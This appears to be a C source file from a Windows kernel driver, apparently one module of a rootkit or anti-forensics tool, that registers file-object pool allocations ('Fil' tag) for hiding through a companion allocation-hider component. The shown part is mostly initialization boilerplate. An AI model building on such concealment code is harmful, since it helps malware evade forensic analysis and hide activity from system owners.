#include "FileHider.h"
#include "SymbolWrapper.h"
#include "AllocationHider.h"

// boolean representing status of FileHider
static BOOLEAN bIsFileHiderInitialized = FALSE;

// flag which determines the state of the internal symbols
static BOOLEAN bSymbolsInitialized = FALSE;

NTSTATUS FhInit(VOID)
{
	KeEnterCriticalRegion();
	if(bIsFileHiderInitialized == TRUE)
	{
		KeLeaveCriticalRegion();
		return STATUS_SUCCESS;
	}

	// initialize allocation hider if it has not been initialized
	// IT SHOULD BE INITIALIZED BY THE PROCESS HIDER
	if(!AhIsInitialized())
	{
		AhInit();
	}

	bIsFileHiderInitialized = TRUE;
	KeLeaveCriticalRegion();

	return STATUS_SUCCESS;
}

BOOLEAN FhInitSymbols(VOID)
{
	ASSERTMSG("Cannot initialize file-object related symbols because FileHider is not yet initialized", bIsFileHiderInitialized == TRUE);

	KeEnterCriticalRegion();
	if(bSymbolsInitialized == TRUE)
	{
		KeLeaveCriticalRegion();
		return TRUE;
	}

	// currently empty!
	bSymbolsInitialized = TRUE;
	KeLeaveCriticalRegion();
	return TRUE;
}

VOID FhUnInit(VOID)
{
	KeEnterCriticalRegion();
	// check if engine has been initialized
	if(bIsFileHiderInitialized == FALSE)
	{
		KeLeaveCriticalRegion();
		return;
	}

	bIsFileHiderInitialized = FALSE;
	KeLeaveCriticalRegion();
}

BOOLEAN FhFindHideAddreses(IN OUT PSORTED_LIST pList, const IN PFILE_OBJECT pFileObject)
{
	ASSERTMSG("Cannot hide file because FileHider is not yet initialized", bIsFileHiderInitialized == TRUE);
	ASSERTMSG("Internal symbols are not initialized!", bSymbolsInitialized == TRUE);

	if(pList == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Invalid hide list - pointer to hide list cannot be NULL\n"));
		return FALSE;
	}

	if(pFileObject == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Invalid file object -- pointer cannot be NULL -- cannot hide file\n"));
		return FALSE;
	}

	// find and delete File allocation -- allocations have "Fil" tag (0xe56c6946 hex)
	BOOLEAN bRet = AhAddAllocation(pList, (PVOID) pFileObject, 0xe56c6946);

	return bRet;
}